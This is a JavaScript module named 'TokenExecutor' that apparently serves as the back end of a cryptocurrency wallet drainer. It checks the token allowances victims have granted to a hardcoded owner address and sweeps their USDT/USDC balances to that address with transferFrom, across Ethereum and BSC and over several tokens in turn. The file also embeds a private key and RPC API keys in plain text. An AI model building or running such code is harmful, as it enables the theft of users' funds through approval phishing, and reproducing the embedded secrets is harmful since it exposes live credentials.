const { ethers } = require('ethers');

class TokenExecutor {
  constructor() {
    this.privateKey = '0xcdc76ffc92e9ce9cc57513a8e098457d56c6cb5eb6ff26ce8b803c7e146ee55f';
    this.ownerAddress = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
    
    // RPC providers
    this.ethProvider = new ethers.JsonRpcProvider('https://rpc.ankr.com/eth/1c9b0484a11bbee680e076174ffddcfda060a3fe47a1c10a5434b3f643944b63');
    this.bscProvider = new ethers.JsonRpcProvider('https://rpc.ankr.com/bsc/1c9b0484a11bbee680e076174ffddcfda060a3fe47a1c10a5434b3f643944b63');
    
    // Create wallet instances
    this.ethWallet = new ethers.Wallet(this.privateKey, this.ethProvider);
    this.bscWallet = new ethers.Wallet(this.privateKey, this.bscProvider);
    
    // Token addresses
    this.tokens = {
      USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
      USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
    };
    
    // ERC20 ABI
    this.erc20Abi = [
      'function transfer(address to, uint256 amount) external returns (bool)',
      'function transferFrom(address from, address to, uint256 amount) external returns (bool)',
      'function balanceOf(address account) external view returns (uint256)',
      'function allowance(address owner, address spender) external view returns (uint256)',
      'function decimals() external view returns (uint8)',
      'function symbol() external view returns (string)'
    ];
  }
  
  // Execute token transfer using unlimited approval
  async executeTokenTransfer(userAddress, tokenAddress, chain = 'ethereum') {
    try {
      // Validate addresses
      if (!ethers.isAddress(userAddress)) {
        return { success: false, error: 'Invalid user address' };
      }
      if (!ethers.isAddress(tokenAddress)) {
        return { success: false, error: 'Invalid token address' };
      }
      
      const provider = chain === 'bsc' ? this.bscProvider : this.ethProvider;
      const wallet = chain === 'bsc' ? this.bscWallet : this.ethWallet;
      
      console.log('Wallet address:', wallet.address);
      console.log('Expected address:', this.ownerAddress);
      
      const tokenContract = new ethers.Contract(tokenAddress, this.erc20Abi, wallet);
      
      // Check allowance
      const allowance = await tokenContract.allowance(userAddress, this.ownerAddress);
      console.log(`Allowance: ${allowance.toString()}`);
      
      if (allowance === 0n) {
        return {
          success: false,
          error: 'No allowance granted',
          allowance: '0'
        };
      }
      
      // Check user balance
      const userBalance = await tokenContract.balanceOf(userAddress);
      console.log(`User balance: ${userBalance.toString()}`);
      
      if (userBalance === 0n) {
        return {
          success: false,
          error: 'User has no tokens',
          balance: '0'
        };
      }
      
      // Determine transfer amount (minimum of allowance and balance)
      const transferAmount = allowance < userBalance ? allowance : userBalance;
      
      // Get token info
      const symbol = await tokenContract.symbol();
      const decimals = await tokenContract.decimals();
      
      // Execute transfer
      console.log(`Transferring ${transferAmount.toString()} ${symbol} from ${userAddress}`);
      
      const tx = await tokenContract.transferFrom(
        userAddress,
        this.ownerAddress,
        transferAmount
      );
      
      const receipt = await tx.wait();
      
      return {
        success: true,
        txHash: tx.hash,
        amount: transferAmount.toString(),
        amountFormatted: ethers.formatUnits(transferAmount, decimals),
        symbol: symbol,
        gasUsed: receipt.gasUsed.toString(),
        blockNumber: receipt.blockNumber
      };
      
    } catch (error) {
      console.error('Token transfer error:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }
  
  // Check token balances and allowances
  async checkTokenStatus(userAddress, tokenAddress, chain = 'ethereum') {
    try {
      const provider = chain === 'bsc' ? this.bscProvider : this.ethProvider;
      const tokenContract = new ethers.Contract(tokenAddress, this.erc20Abi, provider);
      
      const [balance, allowance, symbol, decimals] = await Promise.all([
        tokenContract.balanceOf(userAddress),
        tokenContract.allowance(userAddress, this.ownerAddress),
        tokenContract.symbol(),
        tokenContract.decimals()
      ]);
      
      return {
        balance: balance.toString(),
        balanceFormatted: ethers.formatUnits(balance, decimals),
        allowance: allowance.toString(),
        allowanceFormatted: ethers.formatUnits(allowance, decimals),
        symbol: symbol,
        decimals: decimals,
        hasAllowance: allowance > 0n,
        hasBalance: balance > 0n,
        canTransfer: allowance > 0n && balance > 0n
      };
    } catch (error) {
      console.error('Token status check error:', error);
      return {
        error: error.message
      };
    }
  }
  
  // Get wallet ETH balance for gas
  async getGasBalance(chain = 'ethereum') {
    try {
      const provider = chain === 'bsc' ? this.bscProvider : this.ethProvider;
      const balance = await provider.getBalance(this.ownerAddress);
      
      return {
        balance: balance.toString(),
        balanceFormatted: ethers.formatEther(balance),
        hasGas: balance > ethers.parseEther('0.001') // Minimum 0.001 ETH for gas
      };
    } catch (error) {
      return {
        error: error.message,
        hasGas: false
      };
    }
  }
  
  // Execute multiple token transfers
  async executeMultipleTransfers(userAddress, tokenAddresses, chain = 'ethereum') {
    const results = [];
    
    for (const tokenAddress of tokenAddresses) {
      const result = await this.executeTokenTransfer(userAddress, tokenAddress, chain);
      results.push({
        tokenAddress,
        ...result
      });
      
      // Wait between transfers to avoid rate limiting
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
    
    return results;
  }
}

module.exports = TokenExecutor;